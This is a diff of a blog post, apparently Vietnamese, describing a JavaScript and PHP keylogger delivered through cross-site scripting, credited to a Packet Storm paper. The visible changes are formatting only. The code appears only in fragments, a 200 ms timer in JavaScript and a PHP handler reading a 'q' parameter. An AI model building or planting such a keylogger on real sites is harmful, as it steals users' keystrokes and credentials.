@@ -2,19 +2,17 @@
 title: Javascript,PHP Keylogger
 date: 30/5/2021
 layout: single
-
-
-  
+header:
+  teaser: /assets/images/madoc.png
 --- 
----
+
 ## Credits: Ismailtasdelen
 [https://dl.packetstormsecurity.net/papers/general/xss-keylogger.pdf](https://dl.packetstormsecurity.net/papers/general/xss-keylogger.pdf) 
+
 ## Language
 [![Language](https://img.shields.io/badge/Lang-javascript-blue.svg)](https://www.javascript.com/)
 [![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/)
 
-
---- 
 
 ## Mã Kiểm Tra 
 
@@ -42,7 +40,7 @@ window.SetInterval(function() {
 }, 200);
 ```
 
----
+
 # PHP
 
 ```php
@@ -55,7 +53,7 @@ if(!empty($_GET['q'])) {
 ?>
 
 ```
----
+
 
 
 # Mô Tả 
